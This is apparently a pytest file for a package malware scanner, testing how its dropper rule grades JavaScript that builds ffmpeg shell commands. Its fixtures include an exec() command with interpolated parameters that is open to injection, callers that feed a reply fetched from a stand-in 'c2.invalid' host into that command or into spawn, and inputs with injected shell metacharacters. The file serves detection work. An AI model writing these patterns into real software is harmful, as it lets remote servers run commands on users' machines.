"""Note 78: a shell command a data program (ffmpeg, ffprobe) runs, built only from its function's
parameters, is not a download running. Paired with a fetch in the same file, `SUSPECT.DROPPER.001`
is LOWERED to MEDIUM with the reason, never dropped; anything a server sent or a blob decoded
reaching the command, in the file or from another of the package's files, still blocks.

The thumbnailer is the Baileys shape (lib/Utils/messages-media.js), written fresh; hosts are under
`.invalid` and nothing here is run.
"""

from __future__ import annotations

from typing import ClassVar

from cordon_scanner import Scanner
from cordon_scanner.analysis.javascript.js_flow import JsFlow
from cordon_scanner.foundation.config.settings import Config
from cordon_scanner.foundation.models import Severity


class CommandKit:
    THUMB: ClassVar[str] = (
        'const { exec } = require("child_process");\n'
        "const thumb = (path, destPath, time, size) => new Promise((resolve, reject) => {\n"
        "  const cmd = `ffmpeg -ss ${time} -i ${path} -y -vf scale=${size.width}:-1"
        " -vframes 1 -f image2 ${destPath}`;\n"
        "  exec(cmd, (err) => (err ? reject(err) : resolve()));\n"
        "});\n"
        "const media = async (url) => {\n"
        '  const key = Buffer.from(url.replace("data:;base64,", ""), "base64");\n'
        '  const res = await fetch("https://media.invalid/" + key.length);\n'
        "  return res.arrayBuffer();\n"
        "};\n"
        "module.exports = { thumb, media };\n"
    )

    @staticmethod
    def package(root, files: dict[str, str]):
        root.mkdir(parents=True)
        (root / "package.json").write_text(
            '{"name":"thumb-demo","version":"1.0.0","main":"index.js"}', encoding="utf-8"
        )
        for name, text in files.items():
            (root / name).parent.mkdir(parents=True, exist_ok=True)
            (root / name).write_text(text, encoding="utf-8")
        return root

    @staticmethod
    def scan(root):
        return Scanner(Config.default().with_overrides(use_cache=False)).scan(root)

    @staticmethod
    def dropper(result, path: str):
        return [
            f
            for f in result.findings
            if f.rule_id == "SUSPECT.DROPPER.001" and f.location.path == path
        ]

    @staticmethod
    def blocking(result) -> list[str]:
        return sorted(
            f.rule_id
            for f in result.findings
            if f.severity >= Severity.HIGH and not f.rule_id.startswith("OPERATIONAL.")
        )


class TestTheArm:
    def test_the_parameter_command_is_found(self) -> None:
        assert JsFlow.parameter_command_lines(CommandKit.THUMB) == frozenset({4})

    def test_a_metacharacter_in_the_literal_part_is_a_script(self) -> None:
        text = CommandKit.THUMB.replace("-f image2 ${destPath}", "-f image2 ${destPath}; true")
        assert JsFlow.parameter_command_lines(text) == frozenset()

    def test_a_program_not_on_the_rows_is_a_script(self) -> None:
        assert JsFlow.parameter_command_lines(CommandKit.THUMB.replace("`ffmpeg ", "`node ")) == (
            frozenset()
        )

    def test_a_computed_program_is_a_script(self) -> None:
        text = CommandKit.THUMB.replace("`ffmpeg -ss", "`${destPath} -ss")
        assert JsFlow.parameter_command_lines(text) == frozenset()

    def test_a_fetched_value_in_the_command_is_a_script(self) -> None:
        text = CommandKit.THUMB.replace(
            "  const cmd = `ffmpeg -ss ${time}",
            '  const time2 = await (await fetch("https://t.invalid/")).text();\n'
            "  const cmd = `ffmpeg -ss ${time2}",
        ).replace("new Promise((resolve, reject) =>", "new Promise(async (resolve, reject) =>")
        assert JsFlow.parameter_command_lines(text) == frozenset()

    def test_a_call_in_an_interpolation_is_a_script(self) -> None:
        text = CommandKit.THUMB.replace("${path}", "${pick(path)}")
        assert JsFlow.parameter_command_lines(text) == frozenset()


class TestTheGrade:
    def test_the_thumbnailer_is_lowered_not_dropped(self, tmp_path) -> None:
        result = CommandKit.scan(CommandKit.package(tmp_path / "p", {"index.js": CommandKit.THUMB}))
        found = CommandKit.dropper(result, "index.js")
        assert found, "never dropped: the finding stays on the record"
        assert all(f.severity == Severity.MEDIUM for f in found)
        assert any(
            "a caller in another file could inject" in " ".join(f.explanation.escalations)
            for f in found
        )

    def test_before_the_arm_it_blocked(self, tmp_path) -> None:
        # The same file with a shell metacharacter: the arm does not apply, and the pairing blocks.
        text = CommandKit.THUMB.replace("-f image2 ${destPath}", "-f image2 ${destPath} && true")
        result = CommandKit.scan(CommandKit.package(tmp_path / "p", {"index.js": text}))
        assert any(f.severity >= Severity.HIGH for f in CommandKit.dropper(result, "index.js"))

    def test_another_file_handing_it_a_reply_blocks(self, tmp_path) -> None:
        caller = (
            'const { thumb } = require("./index");\n'
            "(async () => {\n"
            '  const body = await (await fetch("https://c2.invalid/x")).text();\n'
            '  thumb(body, "/tmp/o.jpg", 1, { width: 8 });\n'
            "})();\n"
        )
        result = CommandKit.scan(
            CommandKit.package(tmp_path / "p", {"index.js": CommandKit.THUMB, "run.js": caller})
        )
        assert CommandKit.blocking(result)

    def test_a_computed_require_in_the_package_withdraws_the_lowering(self, tmp_path) -> None:
        # The join cannot follow `require("./" + name)`: it may hand the command a reply.
        caller = (
            'const m = require("./" + (process.argv[2] || "index"));\n'
            "(async () => {\n"
            '  const body = await (await fetch("https://c2.invalid/x")).text();\n'
            '  m.thumb(body, "/tmp/o.jpg", 1, { width: 8 });\n'
            "})();\n"
        )
        result = CommandKit.scan(
            CommandKit.package(tmp_path / "p", {"index.js": CommandKit.THUMB, "run.js": caller})
        )
        assert any(f.severity >= Severity.HIGH for f in CommandKit.dropper(result, "index.js"))

    #: A generated module past the analysis's size limit (Baileys ships a 5 MB WAProto/index.js).
    BIG: ClassVar[str] = "var $root = {};\n" + "$root.m = function (w) { return w; };\n" * 45_000

    def test_a_large_file_reaching_nothing_leaves_it_lowered(self, tmp_path) -> None:
        files = {"index.js": CommandKit.THUMB, "proto/index.js": self.BIG}
        result = CommandKit.scan(CommandKit.package(tmp_path / "p", files))
        found = CommandKit.dropper(result, "index.js")
        assert found
        assert all(f.severity == Severity.MEDIUM for f in found)

    def test_a_large_file_that_reaches_the_package_withdraws_it(self, tmp_path) -> None:
        big = 'const t = require("../index");\n' + self.BIG
        files = {"index.js": CommandKit.THUMB, "proto/index.js": big}
        result = CommandKit.scan(CommandKit.package(tmp_path / "p", files))
        assert any(f.severity >= Severity.HIGH for f in CommandKit.dropper(result, "index.js"))

    def test_a_large_file_another_calls_into_withdraws_it(self, tmp_path) -> None:
        caller = 'const p = require("./proto");\np.m(1);\n'
        files = {"index.js": CommandKit.THUMB, "proto/index.js": self.BIG, "run.js": caller}
        result = CommandKit.scan(CommandKit.package(tmp_path / "p", files))
        assert any(f.severity >= Severity.HIGH for f in CommandKit.dropper(result, "index.js"))

    def test_called_only_with_literals_stays_lowered(self, tmp_path) -> None:
        caller = 'const { thumb } = require("./index");\nthumb("/tmp/a.mp4", "/tmp/o.jpg", 1, { width: 8 });\n'
        result = CommandKit.scan(
            CommandKit.package(tmp_path / "p", {"index.js": CommandKit.THUMB, "run.js": caller})
        )
        assert all(f.severity == Severity.MEDIUM for f in CommandKit.dropper(result, "index.js"))


class TestTheArgvForm:
    def test_a_reply_in_an_ffmpeg_argument_stays_a_flow(self) -> None:
        text = (
            'const { spawn } = require("child_process");\n'
            "(async () => {\n"
            '  const v = await (await fetch("https://c2.invalid/x")).text();\n'
            '  spawn("ffmpeg", ["-i", v, "/tmp/o.jpg"]);\n'
            "})();\n"
        )
        assert any(
            f.sink == "process" and "network_response" in f.sources for f in JsFlow.flows(text)
        )
        assert 4 not in JsFlow.fixed_spawn_lines(text)

    def test_a_parameter_in_an_ffmpeg_argument_is_data(self) -> None:
        text = (
            'const { spawn } = require("child_process");\n'
            'module.exports = (p) => spawn("ffmpeg", ["-i", p, "/tmp/o.jpg"]);\n'
        )
        assert 2 in JsFlow.fixed_spawn_lines(text)
